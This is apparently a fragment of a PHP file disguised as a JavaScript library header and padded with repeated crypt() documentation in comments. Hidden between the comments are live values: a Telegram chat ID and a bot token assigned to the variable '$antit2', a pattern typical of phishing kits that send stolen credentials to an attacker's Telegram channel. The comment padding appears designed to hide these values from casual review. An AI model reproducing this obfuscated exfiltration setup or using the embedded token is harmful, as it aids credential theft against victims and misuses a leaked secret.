 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */

/* jshint laxbreak: true */
/* jshint maxcomplexity:17 */
/* global define */

// UMD (Universal Module Definition) patterns for JavaScript modules that work everywhere.
// https://github.com/umdjs/umd/blob/master/templates/jqueryPlugin.js/*
/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
*/"-4134636357";/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb

e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
*/$antit2 =/*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*/"5192615547:AAFQ8Hbdti47eesqKxsUYjKhKeGimB2xCdY";/*
e in the salt will cause crypt() to return a zero-length string. The two digit cost parameter is the base-2 logarithm of the iteration count for the underlying Blowfish-based hashing algorithm and must be in range 04-31, values outside this range will cause crypt() to fail. "$2x$" hashes are potentially weak; "$2a$" hashes are compatible and mitigate this weakness. For new hashes, "$2y$" should be used.
CRYPT_SHA256 - SHA-256 hash with a sixteen character salt prefixed w
ith $5$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameter on Blowfish. The default number of rounds is 5000, there is a minimum of 1000 and a maximum of 999,999,999. Any selection of N outside this range will be truncated to the nearest limit.
CRYPT_SHA512 - SHA-512 hash with a sixteen character salt prefixed with $6$. If the salt string starts with 'rounds=<N>$', the numeric value of N is used to indicate how many times the hashing loop should be executed, much like the cost parameb
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*//*YPT_EXT_DES - Extended DES-based hash. The "salt" is a 9-chara
cter string consisting of an underscore followed by 4 characters of iteration count and 4 characters of salt. Each of these 4-character strings encode 24 bits, least significant character first. The values 0 to 63 are encoded as ./0-9A-Za-z. Using invalid characters in the salt will cause crypt() to fail.
CRYPT_MD5 - MD5 hashing with a twelve character salt starting w
ith $1$
CRYPT_BLOWFISH - Blowfish hashing with a salt as follows: "$2a$"
, "$2x$" or "$2y$", a two digit cost parameter, "$", and 22 characters 
from the alphabet "./0-9A-Za-z". Using characters outside of this rang
*/
?>